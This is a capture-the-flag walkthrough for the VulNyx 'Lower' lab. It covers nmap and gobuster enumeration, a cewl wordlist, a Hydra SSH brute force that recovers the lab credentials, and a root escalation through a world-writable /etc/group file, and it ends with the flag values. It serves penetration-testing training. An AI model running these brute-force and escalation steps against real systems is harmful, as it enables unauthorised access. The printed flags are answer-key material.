# VulNyx - Lower

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.11.24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-12 14:00 +07
Nmap scan report for 192.168.11.24
Host is up (0.00098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://www.unique.nyx
MAC Address: 08:00:27:0A:8D:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds
```

![web](/walkthroughs/vulnyx/low-difficulty/26_lower/web.png)

The initial `nmap` scan and the website show that there is a redirect to the `unique.nyx` domain.
#### Gobuster
We add the found domain `unique.nyx` to our `/etc/hosts` file for future attacks and obtain the subdomain `tech.unique.nyx` which we also add to our `/etc/hosts` file.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://unique.nyx --append-domain
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://unique.nyx
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
tech.unique.nyx Status: 200 [Size: 19766]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```
![file etc/hosts](/walkthroughs/vulnyx/low-difficulty/26_lower/etc-hosts.png)

![web tech](/walkthroughs/vulnyx/low-difficulty/26_lower/web-tech.png)

![web team](/walkthroughs/vulnyx/low-difficulty/26_lower/web-team.png)

### Shell
We list several possible usernames on the website.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat users.dic ;echo
tom
kathren
lancer
```
We use `cewl` to create a wordlist of passwords from the website's content.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cewl -m6 "http://tech.unique.nyx" --with-numbers -w pass.dic
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

Using Hydra we obtain the credentials `lancer:NewY0rk`
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -t 64 -L users.dic -P pass.dic ssh://192.168.11.24
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-13 10:26:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 399 login tries (l:3/p:133), ~7 tries per task
[DATA] attacking ssh://192.168.11.24:22/
[22][ssh] host: 192.168.11.24   login: lancer   password: NewY0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-13 10:27:33
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh lancer@192.168.11.24           
The authenticity of host '192.168.11.24 (192.168.11.24)' can't be established.
ED25519 key fingerprint is: SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.11.24' (ED25519) to the list of known hosts.
lancer@192.168.11.24's password: 
lancer@lower:~$ id ; hostname
uid=1000(lancer) gid=1000(lancer) grupos=1000(lancer)
lower
```

### Privilege Escalation
#### Enumeration
```bash
lancer@lower:~$ sudo -l
[sudo] contraseña para lancer: 
Sorry, user lancer may not run sudo on lower.
```
```bash 
lancer@lower:~$ find / -writable 2>/dev/null | grep -Ev "proc|sys|dev|tmp|run"
/etc/group
/var/lock
/var/lib/php/sessions
/home/lancer
/home/lancer/.profile
/home/lancer/.bash_logout
/home/lancer/.bashrc
/home/lancer/.bash_history
lancer@lower:~$ ls -l /etc/group
-rw-r--rw- 1 root root 619 dic 15  2024 /etc/group
```
#### Abuse
We add the user lancer to the `sudo` group.
```bash
lancer@lower:~$ grep "sudo" /etc/group
sudo:x:27:lancer
```
We restart the terminal for the changes to take effect and we become the `root` user.
```bash
lancer@lower:~$ su --login lancer
Contraseña: 
lancer@lower:~$ sudo su
[sudo] contraseña para lancer: 
root@lower:/home/lancer# id ;hostname
uid=0(root) gid=0(root) grupos=0(root)
lower
```
#### Flags
```bash
root@lower:/home/lancer# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
b2daf29b8bd041ea1787f345799b61b4
bbb446e708226206823f2f74b9dc540c
```

***You are welcome!***
